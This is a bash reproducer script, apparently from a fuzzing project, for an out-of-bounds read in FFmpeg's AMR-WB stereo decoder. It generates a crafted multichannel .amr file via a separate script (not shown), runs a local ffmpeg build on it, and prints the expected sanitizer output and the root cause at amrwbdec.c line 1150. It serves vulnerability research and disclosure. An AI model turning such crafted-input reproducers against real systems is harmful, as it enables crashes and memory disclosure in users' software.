#!/usr/bin/env bash
# Run script for vuln_001:
#   OOB Read via Missing Buffer-Size Check Before buf Advance in
#   Stereo NO_DATA/Bad-Quality Path (amrwb_decode_frame lines 1140-1152)
#
# Usage:
#   ./vuln_001_run.sh                    # generate input + run
#   ./vuln_001_run.sh /path/to/file.amr  # run with an existing file

set -euo pipefail

FFMPEG="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
GEN_SCRIPT="${SCRIPT_DIR}/vuln_001_gen.py"
INPUT="${1:-${SCRIPT_DIR}/vuln_001_input.amr}"

# ---- Step 1: generate the crafted AMR-WB multichannel file ----------------
if [[ ! -f "${INPUT}" ]] || [[ "${INPUT}" == "${SCRIPT_DIR}/vuln_001_input.amr" ]]; then
    echo "[*] Generating crafted input: ${INPUT}"
    python3 "${GEN_SCRIPT}" "${INPUT}"
fi

echo "[*] Input file : ${INPUT}"
echo "[*] File size  : $(wc -c < "${INPUT}") bytes"
echo "[*] File (hex) : $(xxd -p "${INPUT}" | tr -d '\n')"
echo ""

# ---- Step 2: run ffmpeg ----------------------------------------------------
echo "[*] Running ffmpeg..."
echo "    ${FFMPEG} -i ${INPUT} -f null -"
echo ""

# Allow non-zero exit — the file is intentionally malformed.
set +e
"${FFMPEG}" -i "${INPUT}" -f null - 2>&1
EXIT_CODE=$?
set -e

echo ""
echo "[*] ffmpeg exit code: ${EXIT_CODE}"
echo ""
echo "Expected vulnerability indicators:"
echo "  - Stream reported as stereo (2 channels)"
echo "  - 'Encountered a bad or corrupted frame'  (ch 0, quality=0)"
echo "  - 'Frame too small'                        (ch 1, buf_size=-60)"
echo "  - With Valgrind: 'Invalid read' / 'Conditional jump on uninitialised'"
echo "  - With MSan: 'use-of-uninitialized-value' in decode_mime_header"
echo "  - With ASAN: heap-buffer-overflow only if read lands beyond"
echo "               packet->data + 64 (AV_INPUT_BUFFER_PADDING_SIZE)"
echo ""
echo "Root cause: amrwbdec.c line 1150 advances buf by expected_fr_size (61)"
echo "  without first verifying buf_size >= expected_fr_size, so ch=1's"
echo "  decode_mime_header reads packet->data[61] from a 1-byte packet."
